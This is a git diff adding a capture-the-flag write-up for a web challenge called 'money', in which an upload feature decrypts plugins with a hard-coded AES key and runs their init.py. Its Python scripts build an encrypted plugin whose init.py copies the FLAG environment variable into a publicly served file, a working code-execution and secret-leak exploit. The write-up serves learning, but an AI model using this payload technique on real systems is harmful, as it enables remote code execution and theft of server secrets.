@@ -53,7 +53,7 @@
 
 ### web
 
-- money
+- [money](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#money)
 
 - [dot-private-key](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#dot-private-key)
 
@@ -80,6 +80,107 @@
 - [Ancient_house](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#ancient_house)
 
 ## --------------------------------------------------
+
+### money
+
+- The landing page was all neon and the big “Insert Coin” box. Two widgets were already there (Sales Chart, Flag), and a locked Store teased me.
+
+- I pulled the source. In server.py I saw uploads had to be .plugin files. The server takes the first 16 bytes as IV, decrypts the rest with AES‑CBC using a hard-coded key, treats the plaintext as a ZIP, extracts it, and (the fun part) executes init.py. That shaped the plan: make a tiny plugin to unlock the Store; if the Store’s flag plugin doesn’t reveal the flag, use my own init.py to grab it from the environment.
+
+- First move: create a minimal plugin. I wrote a small builder that zips index.html + icon + plugin_manifest.json and encrypts it into coin.plugin.
+
+```
+--- build_coin_plugin.py ---
+import os, json, zipfile
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from secrets import token_bytes
+
+KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"  # from server.py
+
+os.makedirs("myplugin", exist_ok=True)
+open("myplugin/index.html","w").write("<h1>hello vc</h1>")
+open("myplugin/icon.png","wb").write(
+    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"
+    b"\x90wS\xde\x00\x00\x00\nIDATx\x9cc``\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82"
+)
+json.dump({"name":"Coin","version":"1.0","author":"me","icon":"icon.png"},
+          open("myplugin/plugin_manifest.json","w"))
+
+with zipfile.ZipFile("plugin.zip","w",zipfile.ZIP_DEFLATED) as z:
+    for n in ["index.html","icon.png","plugin_manifest.json"]:
+        z.write(f"myplugin/{n}", arcname=n)
+
+iv = token_bytes(16)
+data = open("plugin.zip","rb").read()
+ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(data,16))
+open("coin.plugin","wb").write(iv+ct)
+print("coin.plugin ready")
+```
+
+- I uploaded coin.plugin via Insert Coin. Third widget appeared, Store unlocked. Nice.
+
+- I grabbed the official flag.plugin and tried the lazy route: decrypt it locally. Here’s the quick decryptor I used.
+
+```
+--- decrypt_flag.py ---
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import zipfile
+
+KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"
+
+blob = open("flag.plugin","rb").read()
+iv, ct = blob[:16], blob[16:]
+pt = unpad(AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct), 16)
+open("flag.zip","wb").write(pt)
+with zipfile.ZipFile("flag.zip") as z:
+    z.extractall("flag_plugin")
+print("unzipped to flag_plugin/")
+```
+
+- That was a dead end. The extracted plugin had an init.py that reads the flag from the server’s environment (os.getenv("FLAG")). Locally, there’s no flag to find.
+
+- So I pivoted: if their init.py runs on upload, mine can run too. I made a second plugin that writes the env flag to a file the app serves from the widget folder.
+
+```
+--- build_steal_plugin.py ---
+import os, json, zipfile
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from secrets import token_bytes
+
+KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"
+
+os.makedirs("steal", exist_ok=True)
+open("steal/index.html","w").write("<h1>hi</h1>")
+open("steal/init.py","w").write(
+    "import os, pathlib\n"
+    "p = pathlib.Path(__file__).resolve().parent\n"
+    "(p/'pwnd.txt').write_text(os.getenv('FLAG','no flag found'))\n"
+)
+open("steal/icon.png","wb").write(
+    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"
+    b"\x90wS\xde\x00\x00\x00\nIDATx\x9cc``\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82"
+)
+json.dump({"name":"Coin","version":"1.0","author":"me","icon":"icon.png"},
+          open("steal/plugin_manifest.json","w"))
+
+with zipfile.ZipFile("plugin.zip","w",zipfile.ZIP_DEFLATED) as z:
+    for n in ["index.html","init.py","icon.png","plugin_manifest.json"]:
+        z.write(f"steal/{n}", arcname=n)
+
+iv = token_bytes(16)
+data = open("plugin.zip","rb").read()
+ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(data,16))
+open("steal.plugin","wb").write(iv+ct)
+print("steal.plugin ready")
+```
+
+- I uploaded steal.plugin. The widget card popped up with a /widget/<uid> URL. Appending /pwnd.txt gave me exactly what I wanted:
+
+- /widget/<uid>/pwnd.txt
+
 
 ### unknown_traffic1
 
